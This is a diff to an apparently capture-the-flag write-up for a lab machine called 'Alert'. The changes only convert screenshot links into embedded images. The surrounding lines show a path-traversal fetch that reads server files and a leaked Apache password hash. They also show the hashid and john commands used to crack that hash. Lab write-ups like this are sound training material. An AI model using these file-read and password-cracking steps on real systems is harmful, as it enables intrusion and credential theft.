@@ -334,19 +334,19 @@ fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistic
 </script>
 ```
 
-[](./.images/Screenshot_Alert-LFI-1.png)
+![](./.images/Screenshot_Alert-LFI-1.png)
 
-[](./.images/Screenshot_Alert-LFI-2.png)
+![](./.images/Screenshot_Alert-LFI-2.png)
 
-[](./.images/Screenshot_Alert-LFI-3.png)
+![](./.images/Screenshot_Alert-LFI-3.png)
 
-[](./.images/Screenshot_Alert-LFI-4.png)
+![](./.images/Screenshot_Alert-LFI-4.png)
 
-[](./.images/Screenshot_Alert-LFI-5.png)
+![](./.images/Screenshot_Alert-LFI-5.png)
 
-[](./.images/Screenshot_Alert-LFI-6.png)
+![](./.images/Screenshot_Alert-LFI-6.png)
 
-[](./.images/Screenshot_Alert-LFI-7.png)
+![](./.images/Screenshot_Alert-LFI-7.png)
 
 And that looks like a username and a password hash:
 
@@ -361,7 +361,7 @@ Let's place these credentials in a file called htpasswd. Then we can feed that t
 hashid '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/'
 ```
 
-[](./.images/Screenshot_Alert-John-1.png)
+![](./.images/Screenshot_Alert-John-1.png)
 
 Looks like we can try using md5. Let's just toss it to john and see what happens.
 
@@ -369,7 +369,7 @@ Looks like we can try using md5. Let's just toss it to john and see what happens
 john --fork=40 --wordlist=/usr/share/wordlists/rockyou.txt htpasswd
 ```
 
-[](./.images/Screenshot_Alert-John-2.png)
+![](./.images/Screenshot_Alert-John-2.png)
 
 Well that was a bust. But there is also a MD5crypt-Long option.
 
@@ -379,11 +379,11 @@ john --fork=40 --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-lon
 
 Here we go:
 
-[](./.images/Screenshot_Alert-John-3.png)
+![](./.images/Screenshot_Alert-John-3.png)
 
 Well, let's give that username and password a try.
 
-[](./.images/Screenshot_Alert-Inital.png)
+![](./.images/Screenshot_Alert-Inital.png)
 
 Success!!!
 
@@ -395,7 +395,7 @@ Super simple on this one:
 cat user.txt
 ```
 
-[](./.images/Screenshot_Alert-User.png)
+![](./.images/Screenshot_Alert-User.png)
 
 Next...
 
